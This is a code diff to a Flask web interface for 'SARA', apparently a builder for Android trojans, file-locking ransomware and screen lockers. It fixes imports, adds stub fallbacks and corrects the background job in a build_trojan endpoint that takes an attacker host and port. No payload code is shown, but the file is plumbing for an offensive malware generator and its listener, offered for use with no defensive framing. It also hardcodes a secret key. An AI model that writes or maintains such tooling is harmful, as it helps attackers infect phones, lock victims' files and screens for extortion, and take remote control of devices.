@@ -18,10 +18,31 @@ import threading
 
 # Import SARA core functions
 sys.path.append('.')
-from sara import (
-    genertare_trojan, genertare_file_locker, genertare_screen_locker,
-    start_trojan_listener, truncates, prints
-)
+try:
+    from sara import (
+        generate_trojan, genertare_file_locker, genertare_screen_locker,
+        start_trojan_listener, truncates, prints
+    )
+except ImportError as e:
+    print(f"Warning: Could not import SARA functions: {e}")
+    # Create dummy functions for development
+    def generate_trojan(host, port, name, icon=None):
+        return f"{name.lower().replace(' ', '')}.apk"
+    
+    def genertare_file_locker(name, desc, icon):
+        return f"{name.lower().replace(' ', '')}.apk"
+    
+    def genertare_screen_locker(name, head, desc, keys, icon):
+        return f"{name.lower().replace(' ', '')}.apk"
+    
+    def start_trojan_listener(host, port):
+        print(f"Would start listener on {host}:{port}")
+    
+    def truncates(text, length=20):
+        return text[:length] + "..." if len(text) > length else text
+    
+    def prints(text):
+        print(text)
 
 app = Flask(__name__)
 app.secret_key = 'sara_web_secret_key_2024'  # Change this in production
@@ -72,9 +93,9 @@ def build_trojan():
             return jsonify({'error': 'Port must be a valid number between 1 and 65535'}), 400
         
         # Start trojan generation in background
-        def generate_trojan():
+        def generate_trojan_task():
             try:
-                result_file = genertare_trojan(name, host, str(port), icon_path)
+                result_file = generate_trojan(host, str(port), name, icon_path)
                 # Store result in session or database for retrieval
                 # For now, we'll just return success
                 return result_file
@@ -83,7 +104,7 @@ def build_trojan():
                 return None
         
         # Run generation in background thread
-        thread = threading.Thread(target=generate_trojan)
+        thread = threading.Thread(target=generate_trojan_task)
         thread.start()
         
         return jsonify({
